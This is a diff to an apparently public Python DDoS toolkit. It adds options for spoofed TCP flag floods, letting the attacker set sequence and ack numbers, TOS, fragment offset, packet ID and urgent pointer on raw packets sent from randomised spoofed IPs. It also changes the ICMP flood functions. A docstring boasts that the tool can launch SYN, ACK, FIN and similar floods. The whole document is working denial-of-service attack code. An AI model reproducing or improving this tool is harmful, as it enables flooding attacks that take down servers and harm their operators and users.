@@ -2121,6 +2121,7 @@ class sflood(threading.Thread):
   self.target=target
   dip=self.target
   self.port=port
+  self.urg_pointer=urg_ptr
   self.synf=synf
   self.rstf=rstf
   self.pshf=pshf
@@ -2137,6 +2138,14 @@ class sflood(threading.Thread):
   self.s_port=s_port
   self.min_por=min_por
   self.max_por=max_por
+  self.seq_number=seqnumber
+  self.ack_seq=ackseq
+  self.packets_id=packetsid
+  sq_nb=0
+  ack_nb=0
+  self.tos=tos_f
+  self.frag_off=frag_off_f
+  self.packet_id=packetsid
   time.sleep(2)
   while (stop!=True):
    try:
@@ -2195,10 +2204,18 @@ class sflood(threading.Thread):
      sip=getip()
     else:
      sip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
+    if self.seq_number==-1:
+        sq_nb=random.randint(0,999999)
+    if self.ack_seq==-1:
+        ack_nb=random.randint(0,999999)
     ips = socket.inet_aton(sip)
     ipd = socket.inet_aton(dip)
     iphv = (4 << 4) + 5
-    iph = pack('!BBHHHBBH4s4s' , iphv, 0, 0, random.randint(1,65535), 0, random.randint(self.minttl,self.maxttl), socket.IPPROTO_TCP, 0, ips, ipd)
+    if self.packet_id<0:
+     pa_id=random.randint(1,65535)
+    else:
+     pa_id=self.packet_id
+    iph = pack('!BBHHHBBH4s4s' , iphv, self.tos, 40+len(urd), pa_id, self.frag_off, random.randint(self.minttl,self.maxttl), socket.IPPROTO_TCP, 0, ips, ipd)
     tcr = (5 << 4) + 0
     tf = self.finf + (self.synf << 1) + (self.rstf << 2) + (self.pshf <<3) + (self.ackf << 4) + (self.urgf << 5)
     if self.winds==0:
@@ -2207,14 +2224,14 @@ class sflood(threading.Thread):
      windf=random.randint(self.min_win,self.max_win)#actual window size= this value * 256
     else:
      windf=self.winds
-    thd = pack('!HHLLBBHHH' , sp, self.port, 0 , self.ackf, 5, tf, socket.htons(windf) , 0, 0)
+    thd = pack('!HHLLBBHHH' , sp, self.port, sq_nb , ack_nb, 5, tf, socket.htons(windf) , 0, self.urg_pointer)
     source_address = socket.inet_aton( sip ) 
     dest_address = socket.inet_aton(dip) 
     tcl = len(thd) + leng 
     psh = pack('!4s4sBBH' , source_address , dest_address , 0, socket.IPPROTO_TCP , tcl); 
     psh = psh + thd + urd; 
     tk = checksum(str(psh))
-    tcp_header = pack('!HHLLBBH',sp, port, 0, ackf, (5 << 4) + 0 , tf, socket.htons (windf))+pack('H',tk)+pack('!H',0)
+    tcp_header = pack('!HHLLBBH',sp, port, sq_nb, ack_nb, (5 << 4) + 0 , tf, socket.htons (windf))+pack('H',tk)+pack('!H',self.urg_pointer)
     packet = iph + tcp_header + urd
     s.sendto(packet, (dip,self.port))
     synflood_counter+=1
@@ -2223,8 +2240,13 @@ class sflood(threading.Thread):
         sys.stdout.flush()
         #print("Packets: {} | IP: {} | Type: {} | Bytes: {}".format(synflood_counter,sip,req,leng))
    except Exception as e:
-    pass
+    print(e)
    time.sleep(self.speed)
+  self.tos=None
+  self.frag_off=None
+  self.urg_pointe=None
+  self.seq_number=None
+  self.ack_seq=None
   self.minsize=None
   self.maxsize=None
   self.speed=None
@@ -2247,7 +2269,8 @@ class sflood(threading.Thread):
   self.s_port=None
   self.min_por=None
   self.max_por=None
-def syn_flood(u,p=80,limiting=True,min_size=10,max_size=50,interval=0.1,source_port=-1,max_port=65535,min_port=1024,ip_range=None,max_window=255,min_window=1,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,window_size=-1,payload=0,min_ttl=64,max_ttl=64,duration=300,logs=True,returning=False):
+  self.packets_id=None
+def syn_flood(u,p=80,limiting=True,min_size=10,max_size=50,interval=0.1,tos=0,packets_id=-1,frag_off=0,urg_pointer=0,seq_number=0,ack_seq=0,source_port=-1,max_port=65535,min_port=1024,ip_range=None,max_window=255,min_window=1,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,window_size=-1,payload=0,min_ttl=64,max_ttl=64,duration=300,logs=True,returning=False):
   '''
    this function is for TCP flags floods with spoofed randomly IPs. you can launch any type of spoofed TCP floods by modifying the parameters (SYN, SYN-ACK, ACK, ACK-PSH, FIN...) and another wonderful thing here is that you can also send either spoofed legitimte HTTP requests (GET & POST), randomly created TCP data (which you can control their size), or just send no data with the spoofed packets, also you can modify the window size and Time To Live (TTL) values for more random and unique packets!!! now this is something you won't fine anywhere else on github or stackoverflow ;).
 
@@ -2274,6 +2297,18 @@ def syn_flood(u,p=80,limiting=True,min_size=10,max_size=50,interval=0.1,source_p
 
 '''
   thr=[]
+  global tos_f
+  tos_f=tos
+  global frag_off_f
+  frag_off_f=frag_off
+  global seqnumber
+  seqnumber=seq_number
+  global ackseq
+  ackseq=ack_seq
+  global packetsid
+  packetsid=packets_id
+  global urg_ptr
+  urg_ptr=urg_pointer
   global minsize
   minsize=min_size
   global maxsize
@@ -2337,7 +2372,7 @@ def syn_flood(u,p=80,limiting=True,min_size=10,max_size=50,interval=0.1,source_p
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    wh+=1
   except socket.error as msg:
-   print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
+   print("[-]Socket could not be created:\n"+str(msg))
   if wh>0:  
    for x in range(threads):
     try:
@@ -3415,12 +3450,12 @@ def icmp_flood(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,min_ttl
  maxttl=max_ttl
  global minttl
  minttl=min_ttl
- wh=0
- try:
+ wh=1
+ """try:
   s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
   wh+=1
  except socket.error as msg:
-  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
+  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")"""
  if wh>0:  
   for x in range(threads):
    try:
@@ -3524,12 +3559,12 @@ def spoofed_icmp_flood(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1
  maxttl=max_ttl
  global minttl
  minttl=min_ttl
- wh=0
- try:
+ wh=1
+ """try:
   s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
   wh+=1
  except socket.error as msg:
-  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
+  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")"""
  if wh>0:  
   for x in range(threads):
    try:
